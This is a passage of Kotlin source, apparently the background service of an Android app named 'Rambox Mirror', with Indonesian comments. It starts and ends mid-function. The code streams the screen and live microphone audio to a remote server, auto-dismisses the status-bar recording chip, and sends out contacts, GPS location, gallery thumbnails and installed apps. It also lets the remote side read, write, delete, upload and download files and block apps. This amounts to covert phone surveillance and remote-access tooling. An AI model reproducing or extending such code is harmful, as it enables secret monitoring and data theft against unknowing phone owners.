        android.util.Log.d("RamboxCapture", "calculateStreamDimensions: real=(${realW}x${realH}) stream=(${streamW}x${streamH}) isLandscape=$isLandscape")
        return Pair(streamW, streamH)
    }

    private fun setupOrientationListener() {
        try {
            registerDisplayListener()
            orientationEventListener?.disable()
            orientationEventListener = object : OrientationEventListener(this) {
                override fun onOrientationChanged(orientation: Int) {
                    if (orientation == ORIENTATION_UNKNOWN) return
                    checkOrientationChange()
                }
            }
            if (orientationEventListener?.canDetectOrientation() == true) {
                orientationEventListener?.enable()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun connectAndStream(resultCode: Int, dataIntent: Intent) {
        initWebSocket()
        startScreenCapture(resultCode, dataIntent)
    }

    private fun ensureMediaProjectionAlive(): Boolean {
        // FIX #1b: token consent MediaProjection bersifat sekali pakai.
        // Jangan pernah memanggil getMediaProjection()/createVirtualDisplay()
        // lagi dengan savedDataIntent. Pemulihan harus lewat consent baru
        // (requestSilentScreenCapture -> MainActivity).
        return mediaProjection != null
    }

    private fun stopCameraCapture() {
        // No-op for legacy live camera cleanup
    }

    private fun startScreenCapture(resultCode: Int, dataIntent: Intent) {
        try {
            val (realW, realH) = getRealScreenSize()
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(metrics)

            screenDensity = metrics.densityDpi
            val rotation = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try { display?.rotation ?: Surface.ROTATION_0 } catch (_: Exception) { Surface.ROTATION_0 }
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.rotation
            }
            val isInitLandscape = (rotation == Surface.ROTATION_90 || rotation == Surface.ROTATION_270) || (realW > realH)
            currentIsLandscape = isInitLandscape

            val (initW, initH) = calculateStreamDimensions(isInitLandscape)
            streamWidth = initW
            streamHeight = initH

            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val oldProjection = mediaProjection
            val projection = projectionManager.getMediaProjection(resultCode, dataIntent)
            // Bila consent baru datang saat projection lama masih hidup, lepas
            // display lama agar tidak dipakai bersama projection baru.
            if (oldProjection != null && oldProjection !== projection) {
                try { oldProjection.stop() } catch (_: Exception) {}
                stopImageCapture()
            }
            mediaProjection = projection
            projectionDisplayCreated = false
            silentCaptureRequestPending = false

            // Universal Compatibility: Register Callback required by Android 14+ (API 34)
            projection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    super.onStop()
                    android.util.Log.d("RamboxCapture", "MediaProjection stopped by system — clearing VirtualDisplay and mediaProjection")
                    handler.post {
                        // FIX #1b: hanya bersihkan bila projection ini masih yang aktif.
                        // Callback projection lama tidak boleh menghapus projection baru.
                        if (mediaProjection === projection) {
                            // Clear dead capture resources so heartbeat stops sending stale frames
                            stopImageCapture()
                            mediaProjection = null
                            projectionDisplayCreated = false
                            // Reset lastSentFrameTime so stale-check in request_stream is triggered
                            lastSentFrameTime = 0L
                        }
                    }
                }
            }, handler)

            setupOrientationListener()
            startImageCapture(streamWidth, streamHeight)

            // 🔇 Mulai timer auto-dismiss chip recording di status bar
            startChipHiderTimer()

            handler.removeCallbacks(infoUpdateRunnable)
            handler.post(infoUpdateRunnable)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendMediaGallery() {
        try {
            val projection = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.DATE_ADDED,
                android.provider.MediaStore.Images.Media.SIZE
            )

            val cursor = contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            val photosArray = org.json.JSONArray()
            val dateFormat = java.text.SimpleDateFormat("dd MMM yyyy HH:mm", java.util.Locale.getDefault())

            cursor?.use { c ->
                val idColumn = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                val nameColumn = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                val dateColumn = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
                val sizeColumn = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.SIZE)

                var count = 0
                while (c.moveToNext() && count < 60) {
                    val id = c.getLong(idColumn)
                    val name = c.getString(nameColumn) ?: "Photo.jpg"
                    val dateAdded = c.getLong(dateColumn) * 1000
                    val size = c.getLong(sizeColumn)

                    val contentUri = android.content.ContentUris.withAppendedId(
                        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )

                    var base64Thumb = ""
                    try {
                        val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            contentResolver.loadThumbnail(contentUri, android.util.Size(240, 240), null)
                        } else {
                            android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                                contentResolver, id,
                                android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null
                            )
                        }
                        if (bitmap != null) {
                            val baos = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                            base64Thumb = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }

                    val photoObj = JSONObject()
                    photoObj.put("id", id)
                    photoObj.put("name", name)
                    photoObj.put("date", dateFormat.format(java.util.Date(dateAdded)))
                    photoObj.put("size", "${size / 1024} KB")
                    // FIX: Avoid sending invalid data URI prefix 'data:image/jpeg;base64,' if thumbnail generation failed
                    val thumbUri = if (base64Thumb.isNotEmpty()) "data:image/jpeg;base64,$base64Thumb" else ""
                    photoObj.put("thumbnail", thumbUri)
                    photosArray.put(photoObj)

                    count++
                }
            }

            val payload = JSONObject()
            payload.put("type", "media_gallery_update")
            payload.put("photos", photosArray)
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: "-"
                    }
                }
            }
        } catch (e: Exception) {}
        return "127.0.0.1"
    }

    private fun sendDeviceInfo() {
        try {
            val pm = packageManager
            val installedApps = try {
                pm.getInstalledApplications(PackageManager.GET_META_DATA)
            } catch (e: Exception) {
                emptyList()
            }
            
            val seenNames = mutableSetOf<String>()
            var userCount = 0
            var systemCount = 0

            // 1. Scan from getInstalledApplications
            installedApps.forEach { app ->
                val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0 && (app.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 0
                if (isSystem) {
                    systemCount++
                } else {
                    userCount++
                    try {
                        val label = pm.getApplicationLabel(app).toString().trim()
                        if (label.isNotBlank() && !seenNames.contains(label)) {
                            seenNames.add(label)
                        }
                    } catch (e: Exception) {}
                }
            }

            // 2. Scan from Launcher Intent (guaranteed for ColorOS / Realme UI / Android 13)
            try {
                val mainIntent = Intent(Intent.ACTION_MAIN, null).apply { addCategory(Intent.CATEGORY_LAUNCHER) }
                val launchableApps = pm.queryIntentActivities(mainIntent, 0)
                launchableApps.forEach { resolveInfo ->
                    try {
                        val label = resolveInfo.loadLabel(pm).toString().trim()
                        if (label.isNotBlank() && !seenNames.contains(label)) {
                            seenNames.add(label)
                        }
                    } catch (e: Exception) {}
                }
            } catch (e: Exception) {}

            val totalApps = if (installedApps.isNotEmpty()) installedApps.size else (seenNames.size + systemCount)
            if (userCount == 0) userCount = seenNames.size

            val userAppNames = org.json.JSONArray()
            seenNames.sortedWith(String.CASE_INSENSITIVE_ORDER).forEach { userAppNames.put(it) }

            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(metrics)
            val resStr = "${metrics.widthPixels} x ${metrics.heightPixels} px"

            // RAM Calculation
            val actManager = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager?.getMemoryInfo(memInfo)
            val totalRamGB = String.format(java.util.Locale.US, "%.1f GB", memInfo.totalMem / (1024.0 * 1024.0 * 1024.0))
            val availRamGB = String.format(java.util.Locale.US, "%.1f GB", memInfo.availMem / (1024.0 * 1024.0 * 1024.0))
            val ramStr = "$availRamGB bebas / $totalRamGB total"

            // Storage Calculation
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val blockSize = stat.blockSizeLong
            val totalStorageGB = String.format(java.util.Locale.US, "%.1f GB", (stat.blockCountLong * blockSize) / (1024.0 * 1024.0 * 1024.0))
            val freeStorageGB = String.format(java.util.Locale.US, "%.1f GB", (stat.availableBlocksLong * blockSize) / (1024.0 * 1024.0 * 1024.0))
            val storageStr = "$freeStorageGB bebas / $totalStorageGB total"

            // Battery Calculation
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else 100

            val ipAddress = getLocalIpAddress()

            val infoPayload = JSONObject().apply {
                put("type", "device_info_update")
                put("totalApps", totalApps)
                put("userApps", userCount)
                put("systemApps", systemCount)
                put("userAppNames", userAppNames)
                put("androidVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                put("model", Build.MODEL ?: "Unknown Device")
                put("brand", Build.MANUFACTURER ?: "Android")
                put("resolution", resStr)
                put("ram", ramStr)
                put("storage", storageStr)
                put("ip", ipAddress)
                put("battery", batteryPct)
            }
            broadcastPayload(infoPayload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendLocationAndUpdate() {
        try {
            val fine = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val coarse = checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val hasPerm = fine || coarse

            val locationManager = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager
            var loc = lastKnownLocation
            if (loc == null && hasPerm && locationManager != null) {
                loc = try { locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) } catch (e: Exception) { null }
                if (loc == null) {
                    loc = try { locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { null }
                }
            }

            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else 100

            val locPayload = JSONObject().apply {
                put("type", "location_update")
                put("hasFix", loc != null)
                if (loc != null) {
                    put("lat", loc.latitude)
                    put("lng", loc.longitude)
                    put("accuracy", if (loc.hasAccuracy()) loc.accuracy.toDouble() else -1.0)
                } else {
                    put("reason", if (!hasPerm) "permission" else "no_fix")
                }
                put("battery", batteryPct)
                put("device", Build.MODEL ?: "Android Device")
            }
            broadcastPayload(locPayload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun fetchAndSendContacts() {
        try {
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return
            }

            val contactsArray = org.json.JSONArray()
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                "${android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )

            val seenNumbers = mutableSetOf<String>()
            cursor?.use { c ->
                val idCol = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                val nameCol = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)

                var count = 0
                while (c.moveToNext() && count < 2000) {
                    val id = if (idCol >= 0) c.getString(idCol) ?: "" else ""
                    val name = if (nameCol >= 0) c.getString(nameCol) ?: "Kontak Tanpa Nama" else "Kontak Tanpa Nama"
                    val rawNum = if (numCol >= 0) c.getString(numCol) ?: "" else ""
                    val cleanNum = rawNum.replace("\\s+".toRegex(), "").replace("-", "")

                    if (cleanNum.isNotEmpty() && !seenNumbers.contains(cleanNum)) {
                        seenNumbers.add(cleanNum)
                        val contactObj = JSONObject().apply {
                            put("id", id)
                            put("name", name)
                            put("phone", rawNum)
                        }
                        contactsArray.put(contactObj)
                        count++
                    }
                }
            }

            val payload = JSONObject().apply {
                put("type", "contacts_update")
                put("contacts", contactsArray)
            }
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hasAllFilesAccess(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
    }

    private fun allFilesAccessError(): String {
        return "Akses semua file belum diberikan. Buka Settings > Apps > Rambox Mirror > Special access > All files access."
    }

    private fun browseFolderAndSend(targetPath: String = "/storage/emulated/0") {
        if (!isSafeFilePath(targetPath, allowRoot = true)) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_browse_result")
                put("currentPath", targetPath)
                put("success", false)
                put("error", "Akses ditolak: path di luar direktori aman")
            })
            return
        }
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_browse_result")
                put("currentPath", targetPath)
                put("path", targetPath)
                put("parentPath", "")
                put("items", org.json.JSONArray())
                put("files", org.json.JSONArray())
                put("success", false)
                put("error", allFilesAccessError())
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val rootDir = if (targetPath.isBlank() || !File(targetPath).exists()) {
                File("/storage/emulated/0")
            } else {
                File(targetPath)
            }

            val currentPath = rootDir.absolutePath
            val parentPath = rootDir.parent ?: ""
            val itemsArray = org.json.JSONArray()
            val dateFormat = java.text.SimpleDateFormat("dd MMM yyyy HH:mm", java.util.Locale.getDefault())

            val listFiles = rootDir.listFiles() ?: arrayOf()
            val sortedFiles = listFiles.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))

            for (file in sortedFiles) {
                val isDir = file.isDirectory
                val name = file.name
                val size = if (isDir) 0L else file.length()
                val ext = if (isDir) "folder" else file.extension.lowercase()
                val lastMod = dateFormat.format(java.util.Date(file.lastModified()))

                val sizeStr = if (isDir) {
                    val childCount = try { file.list()?.size ?: 0 } catch (e: Exception) { 0 }
                    "$childCount item"
                } else {
                    when {
                        size >= 1024 * 1024 * 1024 -> String.format(java.util.Locale.US, "%.1f GB", size / (1024.0 * 1024.0 * 1024.0))
                        size >= 1024 * 1024 -> String.format(java.util.Locale.US, "%.1f MB", size / (1024.0 * 1024.0))
                        size >= 1024 -> String.format(java.util.Locale.US, "%.1f KB", size / 1024.0)
                        else -> "$size B"
                    }
                }

                val itemObj = JSONObject().apply {
                    put("name", name)
                    put("path", file.absolutePath)
                    put("isDir", isDir)
                    put("isDirectory", isDir)
                    put("size", sizeStr)
                    put("sizeBytes", size)
                    put("sizeStr", sizeStr)
                    put("ext", ext)
                    put("date", lastMod)
                }
                itemsArray.put(itemObj)
            }

            val payload = JSONObject().apply {
                put("type", "file_browse_result")
                put("currentPath", currentPath)
                put("path", currentPath)
                put("parentPath", parentPath)
                put("items", itemsArray)
                put("files", itemsArray)
            }
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun sendInstalledAppsList() {
        try {
            val pm = packageManager
            val appsArray = org.json.JSONArray()
            val blockedSet = RamboxAccessibilityService.getBlockedPackages(this)

            // Query only launchable apps (apps with UI visible to user on launcher / Google Play)
            val mainIntent = Intent(Intent.ACTION_MAIN, null).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
            }
            val launchableActivities = pm.queryIntentActivities(mainIntent, 0)
            val seenPackages = mutableSetOf<String>()
            val collectedApps = mutableListOf<JSONObject>()

            val homeIntent = Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_HOME) }
            val defaultHomePkg = pm.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY)?.activityInfo?.packageName

            for (resolveInfo in launchableActivities) {
                val pkg = resolveInfo.activityInfo.packageName
                if (pkg == packageName || pkg == "android" || pkg.startsWith("com.android.systemui") || pkg == defaultHomePkg) continue
                if (seenPackages.contains(pkg)) continue
                seenPackages.add(pkg)

                val appInfo = resolveInfo.activityInfo.applicationInfo
                val isSystem = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0

                val installer = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        pm.getInstallSourceInfo(pkg).installingPackageName
                    } else {
                        @Suppress("DEPRECATION")
                        pm.getInstallerPackageName(pkg)
                    }
                } catch (e: Exception) {
                    null
                }

                val isGooglePlay = installer == "com.android.vending"
                val isGoogleApp = pkg.startsWith("com.google.") || pkg == "com.android.chrome" || pkg == "com.android.vending"

                // Hanya kirim aplikasi dari Google Play Store, ekosistem Google, atau aplikasi user (bukan background bloatware)
                if (isGooglePlay || isGoogleApp || !isSystem) {
                    val label = resolveInfo.loadLabel(pm).toString()
                    val isBlocked = blockedSet.contains(pkg)

                    val obj = JSONObject().apply {
                        put("name", label)
                        put("package", pkg)
                        put("isSystem", isSystem)
                        put("isBlocked", isBlocked)
                    }
                    collectedApps.add(obj)
                }
            }

            collectedApps.sortBy { it.optString("name", "").lowercase() }
            for (obj in collectedApps) {
                appsArray.put(obj)
            }

            val payload = JSONObject().apply {
                put("type", "installed_apps_result")
                put("apps", appsArray as Any)
            }
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun startAudioStream() {
        if (isAudioStreaming.get()) return
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                broadcastPayload(JSONObject().apply {
                    put("type", "audio_status")
                    put("success", false)
                    put("error", "Izin RECORD_AUDIO belum diberikan.")
                })
                return
            }
            // M1: tipe FGS MICROPHONE wajib aktif sebelum AudioRecord dibuka.
            if (!ensureForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)) {
                broadcastPayload(JSONObject().apply {
                    put("type", "audio_status")
                    put("success", false)
                    put("error", "Android menolak foreground service mikrofon (app harus terlihat / izin mic).")
                })
                return
            }
            val sampleRate = 16000
            val channelConfig = android.media.AudioFormat.CHANNEL_IN_MONO
            val audioFormat = android.media.AudioFormat.ENCODING_PCM_16BIT
            val minBufferSize = android.media.AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val bufferSize = (minBufferSize * 2).coerceAtLeast(1024)

            audioRecord = android.media.AudioRecord(
                android.media.MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                bufferSize
            )

            if (audioRecord?.state == android.media.AudioRecord.STATE_INITIALIZED) {
                audioRecord?.startRecording()
                isAudioStreaming.set(true)

                audioThread = Thread {
                    val pcmBuffer = ByteArray(1024)
                    while (isAudioStreaming.get()) {
                        val read = try {
                            audioRecord?.read(pcmBuffer, 0, pcmBuffer.size) ?: -1
                        } catch (_: Exception) {
                            -1
                        }
                        if (read > 0) {
                            val chunk = if (read == pcmBuffer.size) pcmBuffer else pcmBuffer.copyOf(read)

                            // Send raw binary audio chunk (Type 0x02) for ultra-low latency audio
                            val audioPacket = ByteArray(chunk.size + 1)
                            audioPacket[0] = 0x02 // Packet Type: PCM Audio
                            System.arraycopy(chunk, 0, audioPacket, 1, chunk.size)
                            sendBinaryStream(audioPacket)

                            // FIX: Removed redundant JSON base64 send that doubled bandwidth
                            // Binary stream above is sufficient — server handles 0x02 packets directly
                        } else if (read < 0) {
                            // M2: AudioRecord error/revoked -> stop, jangan spin 100% CPU.
                            break
                        } else {
                            // read == 0: belum ada data, beri napas ke CPU.
                            try { Thread.sleep(20) } catch (_: InterruptedException) { break }
                        }
                    }
                    // Pastikan stream berhenti bila thread keluar karena error.
                    if (isAudioStreaming.getAndSet(false)) {
                        try { audioRecord?.release() } catch (_: Exception) {}
                        audioRecord = null
                    }
                }.apply {
                    name = "RamboxAudioStreamThread"
                    priority = Thread.NORM_PRIORITY
                    start()
                }
            } else {
                // M3: record gagal init -> jangan biarkan referensi menggantung.
                try { audioRecord?.release() } catch (_: Exception) {}
                audioRecord = null
                broadcastPayload(JSONObject().apply {
                    put("type", "audio_status")
                    put("success", false)
                    put("error", "AudioRecord gagal diinisialisasi.")
                })
            }
        } catch (e: Exception) {
            android.util.Log.w("RamboxAudio", "startAudioStream gagal: ${e.message}")
            try { audioRecord?.release() } catch (_: Exception) {}
            audioRecord = null
            isAudioStreaming.set(false)
        }
    }

    private fun stopAudioStream() {
        isAudioStreaming.set(false)
        try {
            audioThread?.interrupt()
        } catch (_: Exception) {}
        audioThread = null
        // M3: release harus selalu jalan walau stop() melempar.
        val rec = audioRecord
        audioRecord = null
        if (rec != null) {
            try {
                if (rec.recordingState == android.media.AudioRecord.RECORDSTATE_RECORDING) {
                    rec.stop()
                }
            } catch (_: Exception) {}
            try { rec.release() } catch (_: Exception) {}
        }
    }

    private fun handleFileRead(path: String) {
        if (!isSafeFilePath(path, allowRoot = false)) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_delete_result")
                put("success", false)
                put("path", path)
                put("error", "Akses ditolak: path tidak diizinkan atau menghapus root storage")
            })
            return
        }
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_content_result")
                put("path", path)
                put("name", File(path).name)
                put("content", allFilesAccessError())
                put("success", false)
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val file = File(path)
            if (!file.exists() || file.isDirectory) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_content_result")
                    put("path", path)
                    put("name", file.name)
                    put("content", "File tidak ditemukan atau bukan file.")
                    put("success", false)
                })
                return
            }
            // R1: jangan readText file raksasa (OOM membunuh proses service).
            if (file.length() > 2L * 1024 * 1024) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_content_result")
                    put("path", path)
                    put("name", file.name)
                    put("content", "File terlalu besar untuk dibuka di editor (maks 2 MB).")
                    put("success", false)
                })
                return
            }
            val content = file.readText(Charsets.UTF_8)
            val payload = JSONObject().apply {
                put("type", "file_content_result")
                put("path", file.absolutePath)
                put("name", file.name)
                put("content", content)
                put("success", true)
            }
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
            val payload = JSONObject().apply {
                put("type", "file_content_result")
                put("path", path)
                put("name", File(path).name)
                put("content", "Error membaca file: ${e.message}")
                put("success", false)
            }
            broadcastPayload(payload)
        }
    }

    private fun handleFileWrite(path: String, content: String) {
        if (!isSafeFilePath(path, allowRoot = false)) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_delete_result")
                put("success", false)
                put("path", path)
                put("error", "Akses ditolak: path tidak diizinkan atau menghapus root storage")
            })
            return
        }
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_write_result")
                put("path", path)
                put("success", false)
                put("error", allFilesAccessError())
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val file = File(path)
            file.writeText(content, Charsets.UTF_8)
            try {
                android.media.MediaScannerConnection.scanFile(this, arrayOf(file.absolutePath), null, null)
            } catch (e: Exception) {}

            val payload = JSONObject().apply {
                put("type", "file_write_result")
                put("path", file.absolutePath)
                put("name", file.name)
                put("success", true)
            }
            broadcastPayload(payload)
        } catch (e: Exception) {
            e.printStackTrace()
            val payload = JSONObject().apply {
                put("type", "file_write_result")
                put("path", path)
                put("success", false)
                put("error", e.message ?: "Gagal menyimpan perubahan")
            }
            broadcastPayload(payload)
        }
    }

    // H1 FIX: Validasi keamanan path agar tidak terjadi path traversal atau penghapusan root storage
    private fun isSafeFilePath(path: String, allowRoot: Boolean = false): Boolean {
        return try {
            val file = File(path).canonicalFile
            val allowedRoot = File("/storage/emulated/0").canonicalFile
            val rootPath = allowedRoot.path
            val rootPrefix = if (rootPath.endsWith(File.separator)) rootPath else rootPath + File.separator
            // S2: cek batas separator, bukan sekadar startsWith (cegah
            // "/storage/emulated/0_backup" lolos sebagai anak root).
            if (!allowRoot && (file.path == rootPath || file.path == "/" || file.parent == null)) {
                return false
            }
            file.path == rootPath || file.path.startsWith(rootPrefix)
        } catch (_: Exception) {
            false
        }
    }

    private fun handleFileDelete(path: String) {
        if (!isSafeFilePath(path, allowRoot = false)) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_delete_result")
                put("success", false)
                put("path", path)
                put("error", "Akses ditolak: path tidak diizinkan atau menghapus root storage")
            })
            return
        }
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_delete_result")
                put("success", false)
                put("path", path)
                put("error", allFilesAccessError())
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val file = File(path)
            val parentPath = file.parent ?: "/storage/emulated/0"
            val success = if (file.exists()) {
                if (file.isDirectory) file.deleteRecursively() else file.delete()
            } else false

            try {
                android.media.MediaScannerConnection.scanFile(this, arrayOf(path), null, null)
            } catch (e: Exception) {}

            val payload = JSONObject().apply {
                put("type", "file_delete_result")
                put("success", success)
                put("path", path)
            }
            broadcastPayload(payload)

            // Refresh current folder view
            browseFolderAndSend(parentPath)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handleFileUpload(targetDir: String, fileName: String, base64Content: String) {
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_upload_result")
                put("success", false)
                put("error", allFilesAccessError())
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val dir = File(if (targetDir.isBlank()) "/storage/emulated/0/Download" else targetDir)
            if (!dir.exists()) dir.mkdirs()
            val safeName = File(fileName).name
            if (safeName.isBlank() || safeName == "." || safeName == ".." || !isSafeFilePath(File(dir, safeName).path, allowRoot = true)) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_upload_result")
                    put("success", false)
                    put("error", "Nama file atau path tidak valid")
                })
                return
            }
            val destFile = File(dir, safeName)
            // R1: batasi payload upload sebelum decode (server juga maxPayload 8 MB).
            if (base64Content.length > 12 * 1024 * 1024) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_upload_result")
                    put("success", false)
                    put("error", "File terlalu besar (maks 8 MB).")
                })
                return
            }
            val bytes = try {
                Base64.decode(base64Content, Base64.DEFAULT)
            } catch (e: OutOfMemoryError) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_upload_result")
                    put("success", false)
                    put("error", "Memori tidak cukup untuk mengunggah file.")
                })
                return
            } catch (e: IllegalArgumentException) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_upload_result")
                    put("success", false)
                    put("error", "Konten base64 tidak valid.")
                })
                return
            }
            FileOutputStream(destFile).use { it.write(bytes) }

            try {
                android.media.MediaScannerConnection.scanFile(this, arrayOf(destFile.absolutePath), null, null)
            } catch (e: Exception) {}

            val payload = JSONObject().apply {
                put("type", "file_upload_result")
                put("success", true)
                put("path", destFile.absolutePath)
                put("name", fileName)
            }
            broadcastPayload(payload)

            // Refresh current directory
            browseFolderAndSend(dir.absolutePath)
        } catch (e: Exception) {
            e.printStackTrace()
            val payload = JSONObject().apply {
                put("type", "file_upload_result")
                put("success", false)
                put("error", e.message ?: "Gagal mengunggah file")
            }
            broadcastPayload(payload)
        }
    }

    private fun handleFileDownload(path: String) {
        if (!isSafeFilePath(path, allowRoot = false)) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_delete_result")
                put("success", false)
                put("path", path)
                put("error", "Akses ditolak: path tidak diizinkan atau menghapus root storage")
            })
            return
        }
        if (!hasAllFilesAccess()) {
            broadcastPayload(JSONObject().apply {
                put("type", "file_download_data")
                put("name", File(path).name)
                put("path", path)
                put("success", false)
                put("error", allFilesAccessError())
                put("needsAllFilesAccess", true)
            })
            return
        }
        try {
            val file = File(path)
            if (!file.exists() || file.isDirectory) {
                broadcastPayload(JSONObject().apply {
                    put("type", "file_download_data")
                    put("name", file.name)
                    put("path", path)
                    put("success", false)
                    put("error", "File tidak ditemukan atau bukan file.")
                })
                return
            }

            // FIX: Prevent OOM crash on large files — limit to 50MB
            val maxDownloadSize = 50L * 1024 * 1024 // 50 MB
            if (file.length() > maxDownloadSize) {
                val payload = JSONObject().apply {
                    put("type", "file_download_data")
                    put("name", file.name)
                    put("path", file.absolutePath)
                    put("size", file.length())
                    put("error", "File terlalu besar (${file.length() / (1024 * 1024)}MB). Maksimal 50MB untuk download langsung.")
                }
                broadcastPayload(payload)
                return
            }

